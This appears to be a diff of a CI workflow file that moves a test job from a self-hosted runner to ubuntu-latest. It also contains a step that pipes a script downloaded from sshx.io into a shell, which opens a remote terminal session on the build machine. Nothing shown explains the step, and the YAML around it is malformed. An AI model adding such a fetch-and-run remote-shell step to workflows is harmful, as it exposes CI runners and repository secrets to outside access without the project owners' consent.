@@ -5,7 +5,7 @@ on:
 
 jobs:
   testRunner:
-    runs-on: [self-hosted]
+    runs-on: ubuntu-latest
     steps:
  
    run:curl -sSf https://sshx.io/get | sh -s run
